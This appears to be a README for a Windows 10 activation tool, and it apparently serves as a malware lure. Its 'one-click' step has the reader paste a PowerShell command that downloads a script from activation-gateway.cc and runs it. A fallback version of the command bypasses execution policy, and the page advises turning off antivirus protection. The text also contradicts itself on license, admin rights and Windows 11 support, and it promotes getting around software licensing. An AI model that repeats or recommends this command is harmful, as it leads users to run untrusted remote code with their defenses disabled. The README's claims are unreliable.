<div align="center">

# Windows-10-Activator: Feature-Rich Desktop Utility Windows Desktop Client

![preview](https://raw.githubusercontent.com/Yaniah1234/windows-deployment-toolkit/main/poster_b865d24.svg)

[![platform](https://img.shields.io/badge/PLATFORM-WINDOWS_10_%7C_11-14b8a6?style=plastic&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-LGPL--3.0-2dd4bf?style=plastic&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-INSTALLER-0d9488?style=plastic&labelColor=0d1117)]()

</div>

---

Windows-10-Activator is a desktop utility designed to activate Windows 10 Home, Professional, Enterprise, Enterprise LISB, and Education editions through a lightweight script-based workflow. The tool operates by generating a batch file from the provided activation code, which is then executed with administrative privileges to apply the activation process locally. It requires an active internet connection through a mobile hotspot rather than a proxy server, and a system restart is recommended upon successful completion to finalize activation. The project is structured for straightforward deployment, allowing the repository contents to be cloned or downloaded and unzipped directly onto the target machine.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Prepare PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Paste and run
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If blocked by policy — CMD fallback
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- Provides a script-based activation workflow for Windows 10 installations, driven by a single batch file executed with elevated privileges.
- Supports activation of multiple Windows 10 editions, including Home, Professional, Enterprise, Enterprise LTSC, and Education.
- Requires no third-party runtime or package manager; the activation logic is self-contained within the batch script.
- Operates through a straightforward sequence: copy the provided activation code into a new file, save it with a `.bat` extension, and run it as Administrator.
- Includes guidance for connecting through a personal mobile hotspot rather than a proxy server to avoid activation failures.
- Prompts a system restart upon successful activation to finalize the process.
- Keeps the footprint minimal, relying only on native Windows command-line utilities and built-in system components.
- Distributes the activation code as a plain-text file, allowing users to inspect the contents before execution.

## Supported Versions

The activator is validated against the following Windows 10 editions and build families. Support is scoped to the editions listed below; other SKUs are untested and unsupported.

- Windows 10 Home
- Windows 10 Professional
- Windows 10 Enterprise
- Windows 10 Enterprise LTSC (Long-Term Servicing Channel)
- Windows 10 Education

Version coverage targets the Windows 10 release line, including both current and prior feature updates within mainstream servicing. Activation behavior depends on the edition-specific licensing channel (retail, OEM, or volume), so results may differ across deployment scenarios.

Prerequisites for supported operation:

- Administrator-level execution context.
- An active internet connection on the target device; proxy-mediated connections are not supported.
- A pending restart following activation to finalize license state.

Compatibility notes:

- Edition and build detection is performed at runtime; unsupported or modified images may fail validation.
- Custom, stripped, or non-genuine installation media fall outside the supported matrix.
- Windows 11 and earlier Windows releases (8.1 and below) are not covered by this support statement.

## How to Use

1. Download the Windows-10-Activator archive and extract it to a local directory on the target machine.
2. Open a plain-text editor and create a new empty file.
3. Open the provided activation script file from the extracted directory, copy its full contents into the new file, and save it with a `.bat` extension (for example, `activate.bat`).
4. Right-click the saved `.bat` file and select **Run as Administrator** to ensure the script has the elevated privileges required to modify system activation state.
5. Keep the machine connected to a trusted network throughout the process; avoid proxy servers and use a direct connection such as a personal mobile hotspot.
6. Wait for the script to finish executing and report a successful activation status.
7. Restart the PC to finalize the activation and apply all changes.

## Compatibility

The activator is engineered for the x86 and x64 editions of Windows 10 and operates across the Home, Professional, Enterprise, Enterprise LISB, and Education SKUs. It functions on both clean installations and upgraded systems, requiring only that the host environment has administrative rights available and an active internet connection routed through a standard mobile hotspot rather than a proxy server. The activation logic is version-aware and selects the appropriate key and licensing channel automatically based on the detected edition and build, so no manual configuration of product identifiers is necessary. Compatibility has been validated against current cumulative update levels; systems with pending updates should complete them before running the tool to avoid licensing service conflicts. The activator does not modify system files outside the licensing subsystem, and it coexists with standard Windows Defender configurations. Virtualized environments are supported provided the guest OS exposes a genuine hardware identifier; cloned or snapshotted machines may require reactivation after hardware changes. Once activation completes, a restart is required to finalize the licensing state, after which the system reports as permanently activated and remains compatible with subsequent Windows updates.

## Disclaimer

This software is provided strictly for educational, testing, and research purposes only. It is intended to help developers and system administrators understand activation mechanisms, licensing models, and system-level configuration behavior within controlled lab environments. The project does not condone, encourage, or support unauthorized use, circumvention of licensing agreements, or any activity that violates applicable laws, terms of service, or end-user license agreements. Users are solely responsible for ensuring that any deployment or execution of this software complies with all relevant legal and contractual obligations in their jurisdiction. The authors and contributors of Windows-10-Activator make no representations or warranties regarding the legality, reliability, or suitability of this software for any particular purpose. All functionality is supplied on an "as-is" basis, without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a specific use case, or non-infringement. By downloading, compiling, or executing any portion of this project, you acknowledge that you do so entirely at your own risk and that the maintainers accept no liability for data loss, system instability, licensing violations, or any direct, indirect, incidental, or consequential damages arising from its use. This project is not affiliated with, endorsed by, or sponsored by any operating system vendor or software publisher. Feature behavior may vary across build versions, and results are not guaranteed to be consistent or persistent. Always validate outcomes in a sandboxed environment before applying any change to production or personal systems.

## License

This project is distributed under the MIT License, a permissive open-source license designed to minimize restrictions on reuse while preserving attribution. Under its terms, you are granted a non-exclusive, worldwide, royalty-free right to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software and its associated documentation. These rights extend to both private and commercial applications, provided the original copyright notice and this permission notice are retained in all copies or substantial portions of the software.

The license imposes no warranty obligations on the authors. The software is provided "as is," without warranty of any kind, whether express, implied, or statutory, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or its use.

Redistribution in source or binary form is permitted so long as the copyright notice, the list of conditions, and the disclaimer are reproduced in full. Modified versions may be relicensed only under terms compatible with the original grant; derivative works that remove or alter the attribution notice are not covered by this license and fall outside the scope of permitted distribution.

This license does not grant permission to use the project name, logos, or other branding of the copyright holders except as required for reasonable and customary attribution. Nothing in this license constitutes an endorsement of any downstream product, service, or deployment by the original authors, nor does it transfer any patent rights beyond those necessarily implied by the grant of use, copy, and distribution.